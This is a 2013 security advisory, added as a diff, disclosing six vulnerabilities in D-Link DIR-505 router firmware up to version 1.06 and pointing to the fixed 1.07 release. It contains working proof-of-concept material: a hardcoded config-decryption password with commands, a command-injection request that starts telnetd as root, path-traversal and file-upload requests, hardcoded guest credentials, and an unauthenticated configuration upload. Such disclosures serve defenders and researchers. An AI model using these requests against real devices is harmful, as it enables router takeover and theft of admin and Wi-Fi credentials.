@@ -1,0 +1,193 @@
+Multiple vulnerabilities on D-Link Dir-505 devices
+==================================================
+
+[ADVISORY INFORMATION]
+Title:		Multiple vulnerabilities on D-Link Dir-505 devices
+Discovery date: 05/04/2013
+Release date: 	09/09/2013
+Credits: 	Alessandro Di Pinto (alessandro.dipinto () artificialstudios org)
+Twitter: 	@adipinto
+
+[AFFECTED PRODUCTS]
+This security vulnerability affects the following products and firmware
+versions:
+
+* D-Link DIR-505, firmware version <= 1.06
+
+Other products and firmware versions could also be vulnerable, but they were
+not checked.
+
+[VULNERABILITY DETAILS]
+
+1) Weak configuration file encryption
+The file provided to the end-user in order to make a backup copy of the device
+configuration, is encrypted with a hardcoded password. The device firmware
+creates the configuration file in three specific steps, as shown below:
+   - Collect the configuration data to backup
+   - Encrypt entries with the hardcoded password "sw5-superman"
+   - Create the file header through the tool "imghdr"
+
+The file header has the fixed-size of 84 byte. An attacker ables to get an
+encrypted configuration file could decrypt its contents with the following
+command:
+
+   sh# dd if=config-file of=config-file-no-header bs=84 skip=1
+   sh# ccrypt -d -K sw5-superman config-file-no-header
+
+Decrypted file contains sensitive information that an attacker could use
+in order to compromise the target device (e.g., admin password and WPA
+passphrase).
+
+Furthermore, an attacker can craft a own configuration file, encrypt it with
+the hardcoded password, append at the beginning of file a valid header and
+finally upload the new configuration to the target device without
+authentication, exploiting the "Authentication bypass" issue described inside
+this advisory.
+
+
+2) Command Injection
+An authenticated attacker can exploit the "Ping Test" feature exposed inside
+the page "/System_Check.htm", in order to execute arbitrary commands inside the
+device, with root privileges. More precisely, the "ip_addr" parameter is not
+sanitized properly, thus it is possible to leverage traditional command
+injection techniques. This security issue is exploitable only after a
+successful authentication.
+
+Proof-of-Concept used to open telnet on vulnerable devices:
+
+"""
+POST /my_cgi.cgi HTTP/1.1
+Host: [IP]
+Cookie: uid=[VALID-COOKIE-HERE]
+Content-Length: 55
+
+request=ping_test&ip_addr=127.0.0.1; /usr/sbin/telnetd;
+"""
+
+3) Path traversal (directory listing)
+The web-gui exposed through the port 8181/TCP is used to explore the contents
+of the USB drive, connected at the device. Normally the end-user is allowed to
+list only the files inside the own USB drive but, due to insufficient security
+checks, an attacker is ables to list the contents of every file system
+directories. Only authenticated users can exploit this issue.
+
+Proof-of-Concept used to list the device's /etc/ directory:
+
+http://192.168.0.1:8181/dws/api/ListFile?id=admin&tok=
+	&volid=1&path=usb_dev/usb_A1/../../../../etc
+
+
+4) Path traversal (file upload)
+The web-gui exposed through the port 8181/TCP allows authorized users (e.g.,
+admin user) to upload files inside the USB drive connected at the device. The
+upload feature is present at the following link:
+
+http://[IP]:8181/folder_view.htm
+
+The upload operation is performed through a POST request to the resource
+"/dws/api/UploadFile" using a "multipart/form-data" content-type. Several
+parameters are passed but the "path" parameter can be abused in order to modify
+the destination directory of the uploaded file. This issue allows an
+authenticated user to upload an arbitrary file inside the target device.
+
+Proof-of-Concept used to upload a simple text file inside the /tmp/ directory:
+
+"""
+POST /dws/api/UploadFile?0.35494315220771677 HTTP/1.1
+Host: [IP]:8181
+Cookie: uid=[VALID-COOKIE-HERE]
+Content-Type: multipart/form-data;
+	      boundary=---------------------------736034324104825609817274318
+Content-Length: 1179
+
+-----------------------------736034324104825609817274318
+Content-Disposition: form-data; name="id"
+
+admin
+-----------------------------736034324104825609817274318
+Content-Disposition: form-data; name="tok"
+
+-----------------------------736034324104825609817274318
+Content-Disposition: form-data; name="volid"
+
+1
+-----------------------------736034324104825609817274318
+Content-Disposition: form-data; name="path"
+
+usb_dev/usb_A1/../../../../../../../../../tmp/
+-----------------------------736034324104825609817274318
+Content-Disposition: form-data; name="filename"
+
+exploit.txt
+-----------------------------736034324104825609817274318
+Content-Disposition: form-data; name="upload_file"; filename="test.txt"
+Content-Type: text/plain
+
+malicious text
+-----------------------------736034324104825609817274318--
+"""
+
+
+5) Privilege escalation (hardcoded credential)
+The upload feature, described in the issue 4 titled "Path traversal (upload
+file)", is theoretically designed to be used only by authorized users (selected
+through the web-gui). The device has the following hardcoded user which cannot
+be deleted using the web-gui:
+
+username: guest
+password: guest
+
+Using this credential, the end-user can access the web-gui (exposed on the port
+8181/TCP) in read-only mode; the button used to upload files is disabled in
+attempt to deny unauthorized operations. However due to a wrong session
+handling, an attacker can bypass described limitation following below steps:
+    - Login with the hardcoded user "guest" in order to get a valid cookie.
+    - Using this cookie it is possible to make a direct upload request like the
+      Proof-of-Concept described previously in the issue 4.
+
+The purpose of this exploit is to perform an arbitrary file upload using an
+hardcoded (read-only) user.
+
+
+6) Authentication bypass
+The "my_cgi.cgi" resource exposes several features accessible with no
+authentication. In particular, every request that specifies the HTTP header
+field "Content-type: multipart/form-data" is processed without perform any
+authentication check. An *unauthenticated* attacker can exploit this issue in
+order to upload a malicious configuration on the target device, overwriting the
+original configurations (e.g., set a new admin password).
+
+Proof-of-Concept used to upload a configuration file without perform the login:
+
+"""
+POST /my_cgi.cgi HTTP/1.1
+Host: [IP]
+Cookie: uid=[VALID-COOKIE-HERE]
+Content-Type: multipart/form-data;
+	      boundary=---------------------------4318828241986447042487864450
+Content-Length: 382
+
+-----------------------------4318828241986447042487864450
+Content-Disposition: form-data; name="which_action"
+
+load_conf
+-----------------------------4318828241986447042487864450
+Content-Disposition: form-data; name="file"; filename="attacker-config.bin"
+Content-Type: text/plain
+
+[MALICIOUS-CONFIGURATION-HERE]
+-----------------------------4318828241986447042487864450--
+"""
+
+[REMEDIATION]
+D-Link has released an updated firmware version (1.07) that addresses most of
+the described issues. Firmware is already available on D-Link web site, at the
+following URL:
+ftp://ftp.dlink.com/Gateway/dir505/Firmware/dir505_fw_107.zip
+
+[DISCLAIMER]
+The author is not responsible for the misuse of the information provided in
+this security advisory. The advisory is a service to the professional security
+community. There are NO WARRANTIES with regard to this information. Any
+application or distribution of this information constitutes acceptance AS IS,
+at the user's own risk. This information is subject to change without notice.
